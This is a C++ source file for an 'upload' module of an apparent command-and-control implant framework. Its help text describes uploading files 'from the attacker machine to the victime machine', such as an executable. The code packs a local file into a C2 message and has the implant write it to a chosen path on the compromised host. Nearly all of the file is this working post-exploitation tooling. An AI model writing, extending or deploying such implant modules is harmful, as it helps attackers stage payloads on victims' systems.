#include "Upload.hpp"

#include <cstring>

using namespace std;


const std::string moduleName = "upload";


#ifdef _WIN32

__declspec(dllexport) Upload* UploadConstructor() 
{
    return new Upload();
}

#endif

Upload::Upload()
	: ModuleCmd(moduleName)
{
}

Upload::~Upload()
{
}

std::string Upload::getInfo()
{
	std::string info;
	info += "upload:\n";
	info += "Upload a file from the attacker machine to the victime machine\n";
	info += "exemple:\n";
	info += "- upload c:\\temp\\toto.exe c:\\temp\\toto.exe\n";

	return info;
}

int Upload::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
	if (splitedCmd.size() == 3)
	{
		string inputFile = splitedCmd[1];
		string outputFile = splitedCmd[2];

		std::ifstream input(inputFile, std::ios::binary);
		if( input ) 
		{
			std::string buffer(std::istreambuf_iterator<char>(input), {});

			c2Message.set_instruction(splitedCmd[0]);
			c2Message.set_inputfile(inputFile);
			c2Message.set_outputfile(outputFile);
			c2Message.set_data(buffer.data(), buffer.size());
		}
		else
		{
			c2Message.set_returnvalue("Failed: Couldn't open file.");
			return -1;
		}

	}
	else
	{
		c2Message.set_returnvalue(getInfo());
		return -1;
	}

	return 0;
}


int Upload::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	std::string outputFile = c2Message.outputfile();
	c2RetMessage.set_instruction(m_name);
	c2RetMessage.set_cmd("");

	std::ofstream output(outputFile, std::ios::binary);
	if( output ) 
	{
		const std::string buffer = c2Message.data();
		output << buffer;
		output.close();

		c2RetMessage.set_returnvalue("Success.");
	}
	else
	{
		c2RetMessage.set_returnvalue("Failed: Couldn't create file.");
	}

	return 0;
}
